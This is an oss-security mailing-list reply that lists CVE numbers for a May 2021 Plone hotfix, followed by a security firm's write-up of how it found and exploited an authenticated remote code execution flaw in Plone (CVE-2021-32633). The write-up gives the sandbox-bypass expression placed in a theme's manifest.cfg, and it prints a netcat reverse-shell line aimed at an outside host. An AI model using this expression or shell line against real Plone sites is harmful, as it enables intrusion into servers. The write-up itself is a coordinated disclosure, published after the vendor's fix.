Maurits van Rees <https://maurits.vanrees.org/>
Plone Security Team security@...ne.org

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_031e3e56_20250114_184252.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2021/05/21/1) [[next>]](../../../2021/05/25/1) [[<thread-prev]](../../../2021/05/21/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <dbbd5c0a-cebb-dfed-3c21-967513642d38@vanrees.org>
Date: Sat, 22 May 2021 13:34:10 +0200
From: Maurits van Rees <maurits@...rees.org>
To: oss-security@...ts.openwall.com
Subject: Re: Plone security hotfix 20210518

CVE numbers inline below. Thanks.

On 21/05/2021 16:07, Maurits van Rees wrote:
> A Plone security hotfix was released on Tuesday, May 18 2021.
> For details, see <https://plone.org/security/hotfix/20210518>
> Most CVE numbers are not yet issued. I will request them from Mitre
> shortly.
>
> BTW, I am following the instructions at
> <https://oss-security.openwall.org/wiki/mailing-lists/oss-security#cve-requests>
> to first post to this list, then request CVEs at Mitre, then reply to
> my own post.
> I don't see many other people doing it in this order. Is that page
> still accurate?
>
> Versions Affected: All supported Plone versions (4.3.20 and any
> earlier 4.3.x version, 5.2.4 and any earlier 5.x version).
>
> Versions Not Affected: None. Earlier versions may be affected, but the
> hotfix has not been tested on them.
>
> The patch addresses several security issues:
>
> - Remote Code Execution via traversal in expressions. Reported by
> David Miller. CVE-2021-32633.
> - Writing arbitrary files via docutils and Python Script. Reported by
> Calum Hutton.

CVE-2021-33509

> - Various information disclosures: mostly installation logs. Reported
> by Calum Hutton. CVE-2021-21360 and CVE-2021-21336.
> - Stored XSS from file upload (svg, html). Reported separately by Emir
> Cüneyt Akkutlu and Tino Kautschke.

CVE-2021-33512

> - Reflected XSS in various spots. Reported by Calum Hutton.

CVE-2021-33507

> - XSS vulnerability in CMFDiffTool. Reported by Igor Margitich.

CVE-2021-33513

> - Stored XSS from user fullname. Reported by Tino Kautschke.

CVE-2021-33508 issued, but I forgot that the original reporter already reserved CVE-2021-3313 which is public now with his report.  My bad.

> - Blind SSRF via feedparser accessing an internal URL. Reported by
> Subodh Kumar Shree.
The reporter prefered to request the CVE for this one, so waiting to
hear back.
> - Server Side Request Forgery via event ical URL. Reported by
> MisakiKata and David Miller.

CVE-2021-33510

> - Server Side Request Forgery via lxml parser. Reported by MisakiKata
> and David Miller.

CVE-2021-33511

>
> A hotfix package has been created at
> <https://pypi.org/project/Products.PloneHotfix20210518/>
> The fixes will be incorporated in future release Plone 5.2.5.
>
--
Maurits van Rees <https://maurits.vanrees.org/>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from cyllective.com_bbb25ec2_20250114_184253.html ===
[![](https://cyllective.com/blog/img/cyllective_animated_b.gif.pagespeed.ce.M88UCmodBE.gif)
![](https://cyllective.com/blog/img/cyllective_animated.gif.pagespeed.ce.svPjeg6lp_.gif)
# cyllective's blog](https://cyllective.com/blog/)

[/posts](/blog/posts)

[/cyllectiveâ](https://cyllective.com?ref=blog)

# Plone Authenticated RCE (CVE-2021-32633)

27. May 2021, [#web](https://cyllective.com/blog/tags/web)
[#cms](https://cyllective.com/blog/tags/cms)
[#cve](https://cyllective.com/blog/tags/cve)
[#plone](https://cyllective.com/blog/tags/plone)

**Table of Contents**

* [Labs](#labs)
* [Theming](#theming)
* [Security-Restricted Environment](#security-restricted-environment)
* [Finding a bypass](#finding-a-bypass)
* [Exploitation](#exploitation)
* [Timeline](#timeline)
> Plone is a Python-based open source content management project actively developed since 2002. It is available in more than 40 languages, and comes with 196 add-ons. Plone has had over 89,000 commits made by close to 800 code contributors, representing close to 1,250,000 lines of code.

> Trusted by the CIA, FBI and Others: The Central Intelligence Agency and the Federal Bureau of Investigation have chosen to trust their websites to Plone. Additionally, the government of Brazil, NASA, Disney and many other schools, governments and businesses around the world have chosen Plone for secure, enterprise web content management."
> – [https://plone.com/secure.html â](https://plone.com/secure.html)

Within the reconnaissance & research phase, we’ve stumbled upon a recently disclosed [security advisory posted on Github â](https://github.com/advisories/GHSA-wq6x-g685-w5f2),related to an XXE vulnerability (Improper Restriction of XML External Entity Reference in Plone).

Hence we had a look at the [Plone CMS â](https://plone.org/), to both improve our own understanding of patched vulnerabilities and *potentially* find new vulnerabilities
ourselves.

In this write-up, we go into more detail on how we found an authenticated RCE vulnerability in Plone and how we ended up exploiting it.

# Labs[#](#labs)

In order to get up and running quickly we’ve decided to make use of the official [Docker image â](https://github.com/plone/plone.docker) for our local Plone lab:

```
docker run -p 127.0.0.1:8080:8080 plone:5.2.4

```

After spawning the docker container and creating a new Plone site, we started exploring Plone’s features. Spending a good amount of time playing around with the plaethora of features in Plone, we started focusing on the Theming feature.

# Theming[#](#theming)

While skimming through Plone’s [Theming Manual â](https://4.docs.plone.org/external/plone.app.theming/docs/), we learned about an interesting feature available to theme authors called **TALES expressions**.

According to the theming manual, TALES expressions “work as they do in Zope Page Templates”. So we referred to the [Zope documentation â](https://zope.readthedocs.io/en/latest/zopebook/ZPT.html#tales-expressions) about TALES expressions to learn more about them.

[Appendix C: 27.11. TALES Overview â](https://zope.readthedocs.io/en/latest/zopebook/AppendixC.html#tales-overview) provides an overview of
different TALES expression **types** which we can make use of in our templates:

* **path** - locate a value by its path.
* **exists** - test whether a path is valid.
* **nocall** - locate an object by its path.
* **not** - negate an expression.
* **string** - format a string.
* **python** - execute a Python expression.

The `python expression` type seems very interesting, would this expression type allow us to execute arbitrary Python code?

The more elaborate description under [Appendix C: 27.16. TALES Python expressions â](https://zope.readthedocs.io/en/latest/zopebook/AppendixC.html#tales-python-expressions)
tells us otherwise:

> Python expressions evaluate Python code in a security-restricted environment. Python expressions offer the same facilities as those available in Python-based Scripts and DTML variable expressions.

> Python expressions are subject to Zope permission and role security restrictions. In addition, expressions cannot access objects whose names begin with underscore.

We started digging further into RestrictedPython with the main focus set on understanding the “security-restricted” environment under which python expressions are executed.

# Security-Restricted Environment[#](#security-restricted-environment)

[Zope â](https://plone.org/why-plone/plone-ecosystem/zope), the foundation of Plone, makes use of [RestrictedPython â](https://github.com/zopefoundation/RestrictedPython) to closely control what a theme author is allowed to execute within a `python expression`. In essence, the Python expression is compiled and later executed (via eval) with a limited set of globals available. Some globally available functions, like `getattr`, `setattr` and `delattr` are replaced with custom wrapper functions to enforce even more strict validation of what can and cannot be performed.

To get an idea of what is available to us inside the restricted environment, we edited `/plone/buildout-cache/eggs/cp38/Zope-4.5.5-py3.8.egg/Products/PageTemplates/ZRPythonExpr.py` (inside the docker container) to dump the `globals` argument passed to the `eval` statement.

```
class PythonExpr(PythonExpr):
    _globals = get_safe_globals()
    _globals['_getattr_'] = guarded_getattr
    _globals['__debug__'] = __debug__
    def __init__(self, name, expr, engine):
        self.text = self.expr = text = expr.strip().replace('\n', ' ')
        code, err, warn, use = compile_restricted_eval(
            text, self.__class__.__name__)
        if err:
            raise engine.getCompilerError()(
                'Python expression error:\n%s' % '\n'.join(err))
        self._varnames = list(use.keys())
        self._code = code
    def __call__(self, econtext):
        __traceback_info__ = self.text
        vars = self._bind_used_names(econtext, {})
        vars.update(self._globals)
        with open("/tmp/globals_dump.txt", "w") as fout:
            fout.write(str(vars))
        return eval(self._code, vars, {})

```

We ended up with the following output (shortened for brevity):

```
{
    '__builtins__': {
        'None': None,
        'False': False,
        'True': True,
        ...
        'getattr': <built-in function guarded_getattr>
        'setattr': <function guarded_setattr at 0x7f7f7f211430>,
        'delattr': <function guarded_delattr at 0x7f7f7f211790>,
        '_getattr_': <function safer_getattr at 0x7f7f7f211820>,
        'string': <module 'string' from '/usr/local/lib/python3.8/string.py'>,
        'random': <module 'random' from '/usr/local/lib/python3.8/random.py'>,
        'whrandom': <module 'random' from '/usr/local/lib/python3.8/random.py'>,
        'set': <class 'set'>,
        ...
    },
    ...
}

```

After inspecting the `string`, `math` and `random` Python modules, we found a potential way of executing arbitrary code:

```
random._os.system("nc -e /bin/sh 1.3.3.7 1337")

```

But this violates one of the security environment’s constraints, we are not allowed to access objects whose name starts with an underscore.

![](/blog/posts/cve-2021-32633-plone/underscore_restriction.png.pagespeed.ce.wgyXDtpeK8.png)
# Finding a bypass[#](#finding-a-bypass)

After pondering for a while and reading through the documentation on theming in a bit more detail, we learned that a subset of TALES expression types can be used inside
the TALES python expression itself, as outlined at the end of chapter “27.16.2.2. Built-in Functions”:

> These functions are available in Python expressions, but not in Python-based scripts:

> path(string) Evaluate a TALES path expression.

> string(string) Evaluate a TALES string expression.

> exists(string) Evaluates a TALES exists expression.

> nocall(string) Evaluates a TALES nocall expression.

After experimenting with other TALES expression types available inside the python expression, we realized that the underscore restriction is not enforced in `path`, `string`, `exists` or `nocall`. In other words, we can get a reference to `random._os.system` via the `nocall` expression type.

![](/blog/posts/cve-2021-32633-plone/reference_to_system.png.pagespeed.ce.ksO1fpnrF3.png)

This was the missing piece of the puzzle.

All we need to do now, is call the system function with a command of our choice.

# Exploitation[#](#exploitation)

The following steps lead to exploiting this vulnerability:

1. Authenticate as a privileged user (with theme editing rights)
2. Access the control panel and navigate to the `Theming` page
3. Create a new Theme
4. Edit `manifest.cfg`
5. Extend `manifest.cfg` with a new section called `[theme:parameters]`
6. Populate the new section with the following TALES expression:
   `x = python:nocall("random/_os/system")("<code>")`
7. Populate `<code>` with a reverse shell payload
8. Save `manifest.cfg` and click the `Preview theme` button to trigger the payload

… and finally catch the shell:

![Payload triggered](/blog/posts/cve-2021-32633-plone/exploit.webp)
# Timeline[#](#timeline)

* 2021-04-24: Vulnerability discovered and reported to vendor and our customer
* 2021-04-24: Applied preliminary fix of the issue at the customers site
* 2021-04-24: Vendor response “Thanks for the report!”
* 2021-05-06: Vendor releases [security vulnerability pre-announcement 20210518 â](https://plone.org/security/announcements/20210518-preannounce)
* 2021-05-12: Vendor allocates CVE
* 2021-05-18: Vendor releases [security hotfix 20210518 â](https://plone.org/security/hotfix/20210518)
* 2021-05-22: Vendor publicly discloses [CVE-2021-32633 â](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32633)
* 2021-05-27: Write-up released
**Table of Contents**

* [Labs](#labs)
* [Theming](#theming)
* [Security-Restricted Environment](#security-restricted-environment)
* [Finding a bypass](#finding-a-bypass)
* [Exploitation](#exploitation)
* [Timeline](#timeline)

---

[Logo Twitter](https://twitter.com/cyllective)

[/posts](/blog/posts)

[/tags](/blog/tags)

[/cyllectiveâ](https://cyllective.com?ref=blog)


